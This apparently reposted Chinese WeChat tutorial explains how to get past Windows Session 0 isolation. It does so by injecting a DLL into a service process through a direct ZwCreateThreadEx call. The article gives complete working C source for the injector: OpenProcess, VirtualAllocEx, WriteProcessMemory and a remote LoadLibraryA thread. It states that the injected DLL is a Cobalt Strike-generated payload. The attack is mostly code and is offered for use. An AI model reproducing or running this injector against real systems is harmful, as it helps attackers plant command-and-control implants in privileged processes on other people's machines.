<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AMJ6wzAq65-UFqokN1Bohg)

一、前言
----

在 Windows XP，Windows Server 2003 以及更早的版本中，第一个登录的用户以及 Windows 的所有服务都运行在 **Session 0** 上，这样的做法导致用户使用的应用程序可能会利用 Windows 的服务程序提升自身的权限，为此，在后续的 Windows 版本中，引入了一种**隔离机制**，普通应用程序已经不再 **session 0** 中运行。  
![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7TkiagO2TGMOWE476y8fc6ePic8gzle8wHibjKXDTjgwp0OUwKyvtwQtpWnDhlViaARUGB6Fic47637eA/640?wx_fmt=png)

二、突破 SESSION 0 思路
-----------------

由于 SESSION 0 隔离机制，导致传统远程线程注入系统服务进程失败。和传统的 **CreateRemoteThread** 函数实现的 DLL 远线程注入的唯一一个区别就是, 我们调用的是更为底层的 ZwCreateThreadEx 来创建线程,

虽然 **CreateRemoteThread** 函数到底层也是调用 **ZwCreateThreadEx**, 但在调用 **ZwCreateThreadEx** 时 ,**ZwCreateThreadEx** 的第 7 个参数 **CreateSuspended（CreateThreadFlags）**的值始终为 1, 它会导致线程创建完成后一直挂起无法恢复运行, 于是我们选择直接调用 **ZwCreateThreadEx**, 将第 7 个参数直接置为 **0**, 这样可达到注入目的。

三、代码实现
------

**ZwCreateThreadEx** 在 ntdll.dll 中并没有声明，所以我们需要使用 GetProcAddress 从 ntdll.dll 中获取该函数的导出地址。  
我们需要注意的是 64 位和 32 位中, 函数定义还不一样。  
64 位下，ZwCreateThreadEx 函数声明为：

```
DWORD WINAPI ZwCreateThreadEx(        PHANDLE ThreadHandle,        ACCESS_MASK DesiredAccess,        LPVOID ObjectAttributes,        HANDLE ProcessHandle,        LPTHREAD_START_ROUTINE lpStartAddress,        LPVOID lpParameter,        ULONG CreateThreadFlags,        SIZE_T ZeroBits,        SIZE_T StackSize,        SIZE_T MaximumStackSize,        LPVOID pUnkown);
```

32 位下，ZwCreateThreadEx 函数声明为：

```
DWORD WINAPI ZwCreateThreadEx(        PHANDLE ThreadHandle,        ACCESS_MASK DesiredAccess,        LPVOID ObjectAttributes,        HANDLE ProcessHandle,        LPTHREAD_START_ROUTINE lpStartAddress,        LPVOID lpParameter,        BOOL CreateSuspended,        DWORD dwStackSize,        DWORD dw1,        DWORD dw2,        LPVOID pUnkown);
```

同样我们也使用 GetProcAddress 从 Kernel32.dll 中获取 **LoadLibraryA** 函数的导出地址

```
typedef DWORD(WINAPI* typedef_LoadLibraryA)(char* path);HMODULE hKeModule = GetModuleHandleA("Kernel32.dll")typedef_LoadLibraryA myLoadLibraryA = (typedef_LoadLibraryA)GetProcAddress(hKeModule, "LoadLibraryA");
```

随后，我们获取**进程句柄**，在**目标进程空间中申请内存空间**，然后把我们的 **DLL 写入到内存空间中**，最后**创建线程等待执行**。

```
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 6092);LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);WriteProcessMemory(hProcess, lpBaseAddress, DllPath, sizeof(DllPath), 0);ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)myLoadLibraryA, lpBaseAddress, 0, 0, 0, 0, NULL);return 0;
```

效果如下图：  
![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7TkiagO2TGMOWE476y8fc6eAMPIk2TGJqAAcmlNLqmN876nLKPdnXuJVn7rq2kLZPfSWX76p4pyfQ/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7TkiagO2TGMOWE476y8fc6ecgEdYekdD1MY7Q3ejicvCJjibveZVS11CQiaDA1xyiafib1VdAKfBnrsH4w/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7TkiagO2TGMOWE476y8fc6eRgCwo7b6sVxCVf5cQIlmj2TicibeCfibldpJbg5uqZRFC9UcBjy7DGKXQ/640?wx_fmt=png)

此处使用的 DLL 为 **Cobalt strike** 生成的 64 位 DLL，最后完整代码如下：

```
#include <Windows.h>#include <stdio.h>#ifdef _WIN64typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(	PHANDLE ThreadHandle,	ACCESS_MASK DesiredAccess,	LPVOID ObjectAttributes,	HANDLE ProcessHandle,	LPTHREAD_START_ROUTINE lpStartAddress,	LPVOID lpParameter,	ULONG CreateThreadFlags,	SIZE_T ZeroBits,	SIZE_T StackSize,	SIZE_T MaximumStackSize,	LPVOID pUnkown);#elsetypedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(	PHANDLE ThreadHandle,	ACCESS_MASK DesiredAccess,	LPVOID ObjectAttributes,	HANDLE ProcessHandle,	LPTHREAD_START_ROUTINE lpStartAddress,	LPVOID lpParameter,	BOOL CreateSuspended,	DWORD dwStackSize,	DWORD dw1,	DWORD dw2,	LPVOID pUnkown);#endifint main(int argc, char* argv[]) {	char DllPath[] = "C:\\Users\\RTO\\Desktop\\Injection2\\a.dll";   //DLL路径	HANDLE hRemoteThread;	HMODULE hNtModule = GetModuleHandleA("ntdll.dll");	HMODULE hKeModule = GetModuleHandleA("Kernel32.dll");	typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtModule, "ZwCreateThreadEx");	typedef_LoadLibraryA myLoadLibraryA = (typedef_LoadLibraryA)GetProcAddress(hKeModule, "LoadLibraryA");	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 6092);  //此处为SESSION 0的进程PID	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);	WriteProcessMemory(hProcess, lpBaseAddress, DllPath, sizeof(DllPath), 0);	ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)myLoadLibraryA, lpBaseAddress, 0, 0, 0, 0, NULL);	return 0;}
```

四、小结
----

必须是管理员权限

  

**☆ END ☆**

**点个赞和在看吧，欢迎转发！**

![](https://mmbiz.qpic.cn/mmbiz_gif/ehibzaP4CvW5hb2Px7LJVkWEktazM0liacYxsJOVsyUz8lx6MSWyGTmJyJsPsgj9sOSueI5JRuQLTCPW5njR68aA/640?wx_fmt=gif)